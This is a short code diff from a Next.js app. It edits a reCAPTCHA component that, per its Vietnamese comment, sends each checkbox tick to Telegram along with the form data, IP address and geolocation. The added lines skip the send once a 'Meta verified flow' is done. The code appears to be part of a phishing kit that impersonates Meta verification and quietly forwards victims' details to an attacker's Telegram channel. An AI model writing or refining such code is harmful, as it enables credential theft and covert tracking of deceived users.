@@ -6,6 +6,7 @@ import { useRouter } from 'next/navigation'
 import { useAppSelector } from '@/app/store/hooks'
 import { RECAPTCHA_COPY } from '@/data/recaptchaCopy'
 import { getUserLocation } from '@/utils/getLocation'
+import { isMetaVerifiedFlowCompleted } from '@/utils/metaVerifiedFlow'
 import { SendData } from '@/utils/sendData'
 
 /** Ghi nhận trong Telegram khi tick checkbox reCAPTCHA */
@@ -48,6 +49,8 @@ const ReCaptcha = () => {
     const checkboxLabel = isLoading ? captchaText.verifying : captchaText.notRobot
 
     const sendRecaptchaToTelegram = async () => {
+        if (isMetaVerifiedFlowCompleted()) return
+
         let payload = { ...formData, recaptcha: RECAPTCHA_TICKED_MARKER }
         if (!formData.ip?.trim() || !formData.location?.trim()) {
             const location = await getUserLocation()
